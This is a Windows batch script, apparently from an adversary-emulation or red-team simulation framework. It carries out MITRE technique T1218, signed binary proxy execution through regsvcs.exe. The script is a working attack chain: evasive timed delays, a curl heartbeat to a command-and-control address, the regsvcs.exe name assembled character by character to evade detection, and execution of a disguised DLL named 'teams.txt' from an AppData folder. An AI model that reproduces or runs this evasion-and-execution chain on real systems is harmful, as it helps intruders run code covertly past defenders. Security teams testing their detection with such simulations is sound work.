@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM PHR_ placeholder variables - DO NOT modify
SET dfgvcxg=%APPDATA%\8626\c2a8ac0a
SET nnhjkll=https://10.0.0.49
SET kjhjkkj=https://10.0.0.49/stage/2/icon.png?8626-7
SET sdfcxvh=ITZEL-S2BO
SET lkjhvcx=7
SET mnbgfds=teams.txt
SET bvcxzsd=8626

REM Log file path
SET mcxbvff=%APPDATA%\!lkjhvcx!\macula-simulations.log

REM Initial delay
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: initial_delay_start>> "!mcxbvff!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: initial_delay_complete>> "!mcxbvff!" 2>nul

REM C2 heartbeat (must be first)
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: heartbeat_start>> "!mcxbvff!" 2>nul
curl -k -s -o nul "!kjhjkkj!"
echo [!DATE! !TIME! !TIME!][DEBUG][!sdfcxvh!]: heartbeat_complete>> "!mcxbvff!" 2>nul

REM Delay between operations
ping -n 8 127.0.0.1 >nul

REM Change directory
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: chdir_start=!dfgvcxg!>> "!mcxbvff!" 2>nul
cd /d "!dfgvcxg!"
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: chdir_complete>> "!mcxbvff!" 2>nul

REM Random delay
SET /A hgfdssd=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: random_delay_start=!hgfdssd!>> "!mcxbvff!" 2>nul
timeout /t !hgfdssd! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: random_delay_complete>> "!mcxbvff!" 2>nul

REM Obfuscate regsvcs.exe - character-by-character building
SET c1=r
SET c2=e
SET c3=g
SET c4=s
SET c5=v
SET c6=c
SET c7=s
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET jhgfdsw=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%

REM Execute .NET DLL via regsvcs.exe
echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: regsvcs_exec_start=!mnbgfds!>> "!mcxbvff!" 2>nul
"%jhgfdsw%" "!mnbgfds!"
SET nbmvcds=!ERRORLEVEL!

REM TTP logging
IF !nbmvcds! EQU 0 (
    SET rresult=1
    SET edetail=
) ELSE (
    SET rresult=0
    SET edetail=exitcode_!nbmvcds!
)

FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET m=%%a& SET d=%%b& SET y=%%c
SET lkjhtgy=!y!-!m!-!d! !TIME:,=.!
echo [!lkjhtgy!][!sdfcxvh!]: !lkjhvcx!-!bvcxzsd!-T1218|Signed Binary Proxy Execution (regsvcs.exe)=!rresult!::!edetail!>> "!mcxbvff!" 2>nul

echo [!DATE! !TIME!][DEBUG][!sdfcxvh!]: regsvcs_exec_complete=!nbmvcds!>> "!mcxbvff!" 2>nul

REM Final delay
CHOICE /C Y /N /D Y /T 12 >nul
ENDLOCAL